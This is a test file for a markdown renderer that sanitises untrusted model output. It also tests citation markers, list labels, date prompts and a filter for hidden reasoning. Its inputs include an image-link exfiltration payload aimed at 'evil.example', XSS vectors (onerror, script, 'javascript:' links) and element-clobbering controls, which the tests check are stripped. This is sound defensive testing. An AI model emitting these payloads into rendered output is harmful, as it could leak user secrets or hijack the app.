// @vitest-environment jsdom
import { describe, expect, it } from "vitest";
import { renderMarkdown } from "../src/core/render.js";

describe("rendering untrusted model output", () => {
  it("cannot create app controls or clobber element ids", () => {
    const html = renderMarkdown('<button data-action="purge-history">Click</button> <span data-action="vault-forgot" id="vault-pass" name="x">t</span>');
    expect(html).not.toContain("data-action");
    expect(html).not.toContain("<button");
    expect(html).not.toContain('id="');
  });

  it("strips scripts, images, styles and event handlers", () => {
    const html = renderMarkdown('![x](https://evil.example/?q=secret) <img src=x onerror=alert(1)> <script>alert(1)</script> <a href="javascript:alert(1)" onclick="x()">l</a> <p style="color:red">p</p>');
    expect(html).not.toMatch(/<img|<script|onerror|onclick|javascript:|style=/i);
  });

  it("keeps ordinary formatting and makes links safe", () => {
    const html = renderMarkdown("**Cap**: £2,500,000\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n[site](https://example.com)");
    expect(html).toContain("<strong>Cap</strong>");
    expect(html).toContain("<table>");
    expect(html).toContain('rel="noopener noreferrer nofollow"');
  });
});

describe("automatic citation markers", async () => {
  const { escapeAutoCitations } = await import("../src/core/render.js");
  it("do not turn the text between two markers into strikethrough", () => {
    const text = "The cap is £2,500,000 [~S1]. Fraud is not limited [~S1].";
    const html = renderMarkdown(escapeAutoCitations(text));
    expect(html).not.toContain("<del>");
    expect(html).not.toContain("<s>");
    expect((html.match(/\[~S1\]/g) || []).length).toBe(2); // left intact for the citation decorator
    expect(renderMarkdown("~~real strikethrough~~")).toContain("<del>");
  });
});

describe("list lead-in labels", async () => {
  const { boldListLeadIns } = await import("../src/core/render.js");
  it("bolds a short label at the start of list items", () => {
    expect(boldListLeadIns("1. Choose a Business Name: Pick one.\n- Pay Taxes: Yearly.")).toBe(
      "1. **Choose a Business Name:** Pick one.\n- **Pay Taxes:** Yearly.");
  });
  it("leaves prose, long clauses, bold labels and code alone", () => {
    const text = [
      "Note: not a list item.",
      "1. **Already bold:** fine.",
      "2. The company must keep records for at least six full years: always.",
      "```\n- Key: value\n```",
    ].join("\n");
    expect(boldListLeadIns(text)).toBe(text);
  });
});

describe("open questions know today's date", async () => {
  const { generalSystem } = await import("../src/core/prompt.js");
  it("states the date and asks the model to flag facts that may have changed", () => {
    const prompt = generalSystem(new Date(2026, 9, 5));
    expect(prompt).toMatch(/Today's date is Monday,? 5 October 2026./);
    expect(prompt).toMatch(/who holds an office/);
    expect(prompt).toMatch(/may be out of date/);

  });
});

describe("hidden reasoning", async () => {
  const { thinkingFilter } = await import("../src/engine/llm.js");
  const run = (deltas) => { const f = thinkingFilter(); return deltas.map(f).join(""); };
  it("drops a leading <think> block, even split across deltas", () => {
    expect(run(["<thi", "nk>\nweighing options", "…</thi", "nk>\n\nThe answer."])).toBe("The answer.");
  });
  it("passes normal answers through untouched", () => {
    expect(run(["The ", "answer ", "<think> is literal here"])).toBe("The answer <think> is literal here");
    expect(run(["<", "b>bold</b>"])).toBe("<b>bold</b>");
  });
});
